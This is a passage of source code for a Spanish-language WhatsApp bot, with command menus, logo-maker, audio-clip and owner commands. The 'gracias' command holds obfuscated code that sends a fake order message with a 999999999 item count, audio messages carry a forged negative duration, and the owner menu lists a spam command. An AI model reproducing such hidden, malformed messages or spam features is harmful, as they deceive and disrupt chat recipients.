*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	     🌸 SamịPerry.li 🌸
 ********************************
`
				samu330.sendMessage(from, samuPn, image, { quoted: fvid, caption: `${Menu18}`, thumbnail: samuPn, contextInfo: { mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true } })
				break
			case 'menu7':
				samu330.updatePresence(from, Presence.composing)
				if (!isRegister) return reply(mess.only.usrReg)
				uptime = process.uptime()
				const Menu7 = {
					text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            

Si quieres contribuir para que todos estos comandos y mas funcionen ala perfeccion, puedes aportar un granito de arena al sigiente paypal:

paypal.me/samu330

*Asi me ayudaran tambien a compensar a la persona que pago esta api❤*


${bodyM} ${prefix}blackpink *(Escribe un texto para crear logo)*
${bodyM} ${prefix}neon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}greenneon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}advanceglow *(Escribe un texto para crear logo)*
${bodyM} ${prefix}futureneon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}sandwriting *(Escribe un texto para crear logo)*
${bodyM} ${prefix}sandsummer *(Escribe un texto para crear logo)*
${bodyM} ${prefix}sandengraved *(Escribe un texto para crear logo)*
${bodyM} ${prefix}metaldark *(Escribe un texto para crear logo)*
${bodyM} ${prefix}neonlight *(Escribe un texto para crear logo)*
${bodyM} ${prefix}holographic *(Escribe un texto para crear logo)*
${bodyM} ${prefix}text1917 *(Escribe un texto para crear logo)*
${bodyM} ${prefix}minion *(Escribe un texto para crear logo)*
${bodyM} ${prefix}deluxesilver *(Escribe un texto para crear logo)*
${bodyM} ${prefix}newyearcard *(Escribe un texto para crear logo)*
${bodyM} ${prefix}bloodfrosted *(Escribe un texto para crear logo)*
${bodyM} ${prefix}halloween *(Escribe un texto para crear logo)*
${bodyM} ${prefix}jokerlogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}fireworksparkle *(Escribe un texto para crear logo)*
${bodyM} ${prefix}natureleaves *(Escribe un texto para crear logo)*
${bodyM} ${prefix}bokeh *(Escribe un texto para crear logo)*
${bodyM} ${prefix}toxic *(Escribe un texto para crear logo)*
${bodyM} ${prefix}strawberry *(Escribe un texto para crear logo)*
${bodyM} ${prefix}box3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}roadwarning *(Escribe un texto para crear logo)*
${bodyM} ${prefix}breakwall *(Escribe un texto para crear logo)*
${bodyM} ${prefix}icecold *(Escribe un texto para crear logo)*
${bodyM} ${prefix}luxury *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cloud *(Escribe un texto para crear logo)*
${bodyM} ${prefix}summersand *(Escribe un texto para crear logo)*
${bodyM} ${prefix}horrorblood *(Escribe un texto para crear logo)*
${bodyM} ${prefix}thunder *(Escribe un texto para crear logo)*
${bodyM} ${prefix}pornhub *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glitch *(Escribe un texto para crear logo)*
${bodyM} ${prefix}avenger *(Escribe un texto para crear logo)*
${bodyM} ${prefix}space *(Escribe un texto para crear logo)*
${bodyM} ${prefix}ninjalogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}marvelstudio *(Escribe un texto para crear logo)*
${bodyM} ${prefix}lionlogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wolflogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}steel3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wallgravity *(Escribe un texto para crear logo)*
${bodyM} ${prefix}sombra *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cup *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cup1 *(Escribe un texto para crear logo)*
${bodyM} ${prefix}romance *(Escribe un texto para crear logo)*
${bodyM} ${prefix}smoke *(Escribe un texto para crear logo)*
${bodyM} ${prefix}burnpaper *(Escribe un texto para crear logo)*
${bodyM} ${prefix}lovemessage *(Escribe un texto para crear logo)*
${bodyM} ${prefix}undergrass *(Escribe un texto para crear logo)*
${bodyM} ${prefix}love *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cafe *(Escribe un texto para crear logo)*
${bodyM} ${prefix}woodheart *(Escribe un texto para crear logo)*
${bodyM} ${prefix}woodenboard *(Escribe un texto para crear logo)*
${bodyM} ${prefix}summer3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wolfmetal *(Escribe un texto para crear logo)*
${bodyM} ${prefix}nature3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}underwater *(Escribe un texto para crear logo)*
${bodyM} ${prefix}golderrose *(Escribe un texto para crear logo)*
${bodyM} ${prefix}summernature *(Escribe un texto para crear logo)*
${bodyM} ${prefix}letterleaves *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glowingneon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}fallleaves *(Escribe un texto para crear logo)*
${bodyM} ${prefix}flamming *(Escribe un texto para crear logo)*
${bodyM} ${prefix}hp *(Escribe un texto para crear logo)*
${bodyM} ${prefix}carvedwood *(Escribe un texto para crear logo)*
${bodyM} ${prefix}tiktok *(Escribe un texto para crear logo)*
${bodyM} ${prefix}arcade8bit *(Escribe un texto para crear logo)*
${bodyM} ${prefix}battlefield4 *(Escribe un texto para crear logo)*
${bodyM} ${prefix}pubg *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wetglass *(Escribe un texto para crear logo)*
${bodyM} ${prefix}multicolor3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}watercolor *(Escribe un texto para crear logo)*
${bodyM} ${prefix}luxurygold *(Escribe un texto para crear logo)*
${bodyM} ${prefix}galaxywallpaper *(Escribe un texto para crear logo)*
${bodyM} ${prefix}lighttext *(Escribe un texto para crear logo)*
${bodyM} ${prefix}beautifulflower *(Escribe un texto para crear logo)*
${bodyM} ${prefix}puppycute *(Escribe un texto para crear logo)*
${bodyM} ${prefix}royaltext *(Escribe un texto para crear logo)*
${bodyM} ${prefix}heartshaped *(Escribe un texto para crear logo)*
${bodyM} ${prefix}birthdaycake *(Escribe un texto para crear logo)*
${bodyM} ${prefix}galaxystyle *(Escribe un texto para crear logo)*
${bodyM} ${prefix}hologram3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}greenneon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glossychrome *(Escribe un texto para crear logo)*
${bodyM} ${prefix}greenbush *(Escribe un texto para crear logo)*
${bodyM} ${prefix}metallogo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}noeltext *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glittergold *(Escribe un texto para crear logo)*
${bodyM} ${prefix}textcake *(Escribe un texto para crear logo)*
${bodyM} ${prefix}starsnight *(Escribe un texto para crear logo)*
${bodyM} ${prefix}wooden3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}textbyname *(Escribe un texto para crear logo)*
${bodyM} ${prefix}writegalacy *(Escribe un texto para crear logo)*
${bodyM} ${prefix}galaxybat *(Escribe un texto para crear logo)*
${bodyM} ${prefix}snow3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}birthdayday *(Escribe un texto para crear logo)*
${bodyM} ${prefix}goldplaybutton *(Escribe un texto para crear logo)*
${bodyM} ${prefix}silverplaybutton *(Escribe un texto para crear logo)*
${bodyM} ${prefix}freefire *(Escribe un texto para crear logo)**
${bodyM} ${prefix}gtav *(Etiqueta una imagen)*
${bodyM} ${prefix}wanted *(Etiqueta una imagen)*
${bodyM} ${prefix}wasted *(Etiqueta una imagen)*
${bodyM} ${prefix}ocean *(Etiqueta una imagen)*
${bodyM} ${prefix}ger *(Etiqueta una imagen)*
${bodyM} ${prefix}drawing *(Etiqueta una imagen)*
${bodyM} ${prefix}cg *(Etiqueta una imagen)*

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	     🌸 SamịPerry.li 🌸
 ******************************
`,
					contextInfo: {
						mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
					}
				}
				samu330.sendMessage(from, Menu7, MessageType.text, {
					quoted: fvid
				})
				break
			case 'menu8':
				samu330.updatePresence(from, Presence.composing)
				if (!isRegister) return reply(mess.only.usrReg)
				const Menu8 = {
					text: `*COMANDOS PARA ${botNumber}*

*Pará actualizar el bot:*
_${prefix}actualizar_

*Para apagar el bot:*
_${prefix}apagar_


⚠️ El siguiente comando es para restablecer los datos del usuario, para que el código vuelva a generarce, esto es por si quiere tener el bot en algún otro numero, o por si por error cerró la sección en WhatsApp. 

*${prefix}Restaurar*

╭─────────────
│ *${prefix}bloquear*
│ _Bloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}desbloquear*
│ _Desbloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}setname*
│ _Cambia tu nombre de usuario_
│
│ *${prefix}setpic*
│ _Actualiza tu foto de perfil_
│
│ *${prefix}setstatus*
│ _Cambia tu estado de WhatsApp_
╰─────────────╮
╭─────────────╯
│ *${prefix}estado*
│ _Envia un estado de texto_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadopic*
│ _Envia una imagen a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadovid*
│ _Envia un video a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciar*
│ _Vacia el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciartodo*
│ _Elimina todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}bc*
│ _Broadcast_
╰─────────────╮
╭─────────────╯
│ *${prefix}spam*
│ _Spam de mensajes_
╰─────────────╮
╭─────────────╯
│ *${prefix}fijar*
│ _Fijar el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desfijar*
│ _Desfija el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}archivar*
│ _Archiva un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desarchivar*
│ _Desarchiva todo_
╰─────────────╮
╭─────────────╯
│ *${prefix}silencio*
│ _Mutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desilenciar*
│ _Desmutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}sinleer*
│ _Muestra Chats sin leer_
╰─────────────╮
╭─────────────╯
│ *${prefix}apagar*
│ _Apaga el bot_
╰─────────────╮
╭─────────────╯
│ *${prefix}marcarsinleer*
│ _Marca como no leido todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}leertodo*
│ _Lee todos los chats_
╰──────────────────────`,
					contextInfo: {
						mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
					}
				}
				samu330.sendMessage(from, Menu8, MessageType.text, {
					quoted: ftoko
				})
				break


			case 'gracias':
				var _0x56da = ['367342lxQRgg', 'relayWAMessage', '52224EUhLvZ', 'readFileSync', '3184312811796096', '2ZQhqXh', '37BvfGXn', '1QpYCgS', '233589MYSAPS', '296046BsnUGu', './src/fake.jpg', '11131Xmdsqw', '🤭 *Tranqui, no es nada* 😉', '41623ZFgijY', '4lYyqCf', 'INQUIRY', 'prepareMessageFromContent', '1081869VYGFAG', '1QmBtcR']; var _0x3cb2d7 = _0x44c4; function _0x44c4(_0x538587, _0x3dc520) { return _0x44c4 = function (_0x56dab7, _0x44c4ad) { _0x56dab7 = _0x56dab7 - 0x11b; var _0x4c2ec7 = _0x56da[_0x56dab7]; return _0x4c2ec7; }, _0x44c4(_0x538587, _0x3dc520); } (function (_0x1c8e57, _0x5dcd2a) { var _0x2b3ad5 = _0x44c4; while (!![]) { try { var _0x1e1a08 = parseInt(_0x2b3ad5(0x11b)) * parseInt(_0x2b3ad5(0x127)) + parseInt(_0x2b3ad5(0x12c)) + parseInt(_0x2b3ad5(0x122)) + parseInt(_0x2b3ad5(0x11e)) * parseInt(_0x2b3ad5(0x121)) + parseInt(_0x2b3ad5(0x126)) * -parseInt(_0x2b3ad5(0x12b)) + parseInt(_0x2b3ad5(0x124)) * parseInt(_0x2b3ad5(0x11f)) + -parseInt(_0x2b3ad5(0x120)) * parseInt(_0x2b3ad5(0x12a)); if (_0x1e1a08 === _0x5dcd2a) break; else _0x1c8e57['push'](_0x1c8e57['shift']()); } catch (_0x52a340) { _0x1c8e57['push'](_0x1c8e57['shift']()); } } }(_0x56da, 0x99469), res = await samu330[_0x3cb2d7(0x129)](from, { 'orderMessage': { 'orderId': _0x3cb2d7(0x11d), 'thumbnail': fs[_0x3cb2d7(0x11c)](_0x3cb2d7(0x123)), 'itemCount': 999999999, 'status': _0x3cb2d7(0x128), 'surface': 'CATALOG', 'message': _0x3cb2d7(0x125), 'orderTitle': '' }, 'contextInfo': { 'forwardingScore': 0x3, 'isForwarded': !![] } }, { 'quoted': sam, 'contextInfo': {} }), samu330[_0x3cb2d7(0x12d)](res));
				break

			//audios 
			case 'confeti':
				aud = fs.readFileSync('./audio/confeti.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'anana':
				aud = fs.readFileSync('./audio/anana.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'asen':
				aud = fs.readFileSync('./audio/asen.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'flash':
				aud = fs.readFileSync('./audio/flash.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'asen':
				aud = fs.readFileSync('./audio/asen.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'hentai':
				aud = fs.readFileSync('./audio/hentai.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'jai':
				aud = fs.readFileSync('./audio/jai.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'jashire':
				aud = fs.readFileSync('./audio/jashire.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'kareta':
				aud = fs.readFileSync('./audio/kareta.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'kataka':
				aud = fs.readFileSync('./audio/kataka.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'kicks':
				aud = fs.readFileSync('./audio/kicks.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'kobarashi':
				aud = fs.readFileSync('./audio/kobarashi.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'mitamita':
				aud = fs.readFileSync('./audio/mitamita.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'mma':
				aud = fs.readFileSync('./audio/mma.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'motomoto':
				aud = fs.readFileSync('./audio/motomoto.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'nani':
				aud = fs.readFileSync('./audio/nani.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'niconico':
				aud = fs.readFileSync('./audio/niconico.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'nya':
				aud = fs.readFileSync('./audio/nya.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'nyan':
				aud = fs.readFileSync('./audio/nyan.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'omaiga':
				aud = fs.readFileSync('./audio/omaiga.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'omaiwa':
				aud = fs.readFileSync('./audio/omaiwa.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'omg':
				aud = fs.readFileSync('./audio/omg.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'onichan':
				aud = fs.readFileSync('./audio/onichan.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'ooaa':
				aud = fs.readFileSync('./audio/ooaa.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'piano':
				aud = fs.readFileSync('./audio/piano.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'pikachu':
				aud = fs.readFileSync('./audio/pikachu.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'pupu':
				aud = fs.readFileSync('./audio/pupu.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'sempai':
				aud = fs.readFileSync('./audio/sempai.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'sss':
				aud = fs.readFileSync('./audio/sss.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'suspenso':
				aud = fs.readFileSync('./audio/suspenso.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'talcho':
				aud = fs.readFileSync('./audio/talcho.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'tobec':
				aud = fs.readFileSync('./audio/tobec.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'tuturu':
				aud = fs.readFileSync('./audio/tuturu.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'tututu':
				aud = fs.readFileSync('./audio/tututu.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'uchinchi':
				aud = fs.readFileSync('./audio/uchinchi.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'uff':
				aud = fs.readFileSync('./audio/uff.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'uma':
				aud = fs.readFileSync('./audio/uma.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'umai':
				aud = fs.readFileSync('./audio/umai.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'woau':
				aud = fs.readFileSync('./audio/woau.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'yajaro':
				aud = fs.readFileSync('./audio/yajaro.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'yame':
				aud = fs.readFileSync('./audio/yame.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'yamete':
				aud = fs.readFileSync('./audio/yamete.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'yokese':
				aud = fs.readFileSync('./audio/yokese.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'yutki':
				aud = fs.readFileSync('./audio/yutki.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'ñaña':
				aud = fs.readFileSync('./audio/ñaña.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'ñañañi':
				aud = fs.readFileSync('./audio/ñañañi.ogg')
				samu330.sendMessage(from, aud, audio, { quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: -999999, sendEphemeral: true })
				break
			case 'audios':
				reply(`*Estos audios son originales, provenientes de la app:*\nhttps://play.google.com/store/apps/details?id=com.aromaticnectarineapps.anime\n\n- anana\n- asen\n- flash\n- hentai\n- jai\n- jashire\n- kareta\n- kataka\n- kicks\n- kobarashi\n- mitamita\n- mma\n- motomoto\n- nani\n- niconico\n- nya\n- nyan\n- omaiga\n- omaiwa\n- omg\n- onichan\n- ooaa\n- piano\n- pikachu\n- pupu\n- sempai\n- sss\n- suspenso\n- talcho\n- tobec\n- tuturu\n- tututu\n- uchinchi\n- uff\n- uma\n- umai\n- unga\n- woau\n- yajaro\n- yame\n- yamete\n- yokese\n- yutki\n- ñaña\n- ñañañi\n\n🍒 *By Samu330* 💠`)
				break

			case 'top5':
				if (!isGroup) return reply('*Este comando solo puede usarse en grupos🤕')
				member = []
				top5 = args.join(' ')
				const p1 = groupMembers
				const p2 = groupMembers
				const p3 = groupMembers
				const p4 = groupMembers
				const p5 = groupMembers
				const o1 = p1[Math.floor(Math.random() * p1.length)]
				const o2 = p2[Math.floor(Math.random() * p2.length)]
				const o3 = p3[Math.floor(Math.random() * p3.length)]
				const o4 = p4[Math.floor(Math.random() * p4.length)]
				const o5 = p5[Math.floor(Math.random() * p5.length)]
				teks = `
*😵TOP CINCO:*\n\n1= @${o1.jid.split('@')[0]}\n\n2=@${o2.jid.split('@')[0]}\n\n3=@${o3.jid.split('@')[0]}\n\n4= @${o4.jid.split('@')[0]}\n\n5= @${o5.jid.split('@')[0]}\n\n\n_Top 5 de_ *${top5}* en este grupo`
				member.push(o1.jid)
				member.push(o2.jid)
				member.push(o3.jid)
				member.push(o4.jid)
				member.push(o5.jid)
				mentions(teks, member, true)
				break

			case 'pregunta':
				respuesta = ['Si', 'No', 'Tal vez', 'Puede ser', 'Ahí una probabilidad del 99.99999999991.01%', 'Puede que no', 'Qué sé yo', 'mmmm🤔.... Dejame pensarlo un poco']
				answer = respuesta[Math.floor(Math.random() * respuesta.length)]
				if (!q) return reply('¿Y la pregunta?')
				reply(answer)
				break

			case 'lyric':
			case 'letra':
			case 'letras':
				if (args.length < 1) return reply(`Escribe el nombre del artista o grupo junto al nombre de la canción.\nPor ejemplo: ${prefix + command} Camila Mientes`)
				if (!isRegister) return reply(mess.only.usrReg)
				samu330.updatePresence(from, Presence.composing)
				tels = args.join(' ')
				try {
					anu = await getJson(`https://fxc7-api.herokuapp.com/api/search/liriklagu?apikey=Fxc7&query=${tels}`, {
						method: 'get'
					})
					reply(`Letra de ${tels}:\n\n____________________\n\n${anu.result}`)
				} catch {
					reply(mess.ferr)
				}
				break


			case 'google':
				assistant = fs.readFileSync('./src/assistant.jpg')
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				let buscar = args.join(' ')
				if (!buscar) return reply('¿Que deseas buscar?')
				let search = await samuGg({ query: buscar })
				let ggsm = ``
				for (let i of search) {
					ggsm += `
*Titulo:* ${i.title}
*Link:* ${i.link}
*Contenido:* ${i.snippet}

`
				}
				var nyangg = ggsm.trim()
				reply(`*🔍Busqueda realizada\n\n${nyangg}`)
				break

			case 'apagar':
				if (!isOwner) return reply('tu quien eres para decirme que hacer!?🤔')
				reply('Me apagare en 3 Segundos....')
				setTimeout(() => {
					samu330.close()
				}, 3000)
				break

			case 'restaurar':
				if (!itsMe) return reply('tu quien eres para decirme que hacer!?🤔')
				reply('*LA INFORMACION DE ESTE USUARIO SE RESTABLECERA PARA PODER USAR Y ESCANEAR EL CODIGO EN OTRO DISPOSITIVO*')
				exec(`bash restore.sh`, (err, stdout) => {
					if (err) return reply(err)
					if (stdout) reply(stdout)
				})
				break

			case 'actualizar':
			case 'update':
				if (!itsMe) return reply('tu quien eres para decirme que hacer!?🤔')
				reply('*ESPERE UN MOMENTO... EL BOT ESTA SIENDO ACTUALIZADO CON LAS ÚLTIMAS MODIFICACIONES DE: https://github.com/Samu330/NyanBot*')
				exec(`bash update.sh`, (err, stdout) => {
					if (err) return reply(err)
					if (stdout) reply(`*El bot se ah actualizado de forma satisfactoria*\n Informe de la actualización:\n\n${stdout}\n\n Los cambios serán reflejados la próxima vez que inicie el bot.`)
				})
				break

			case 'teles':
				if (args.length == 0) return reply(`Ejemplo: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
				ini_url = args[0]
				ini_url = await getJson(`https://api.lolhuman.xyz/api/telestick?apikey=${api}&url=${ini_url}`)
				ini_sticker = ini_url.result.sticker
				for (sticker_ in ini_sticker) {
					ini_buffer = await getBuffer(ini_sticker[sticker_])
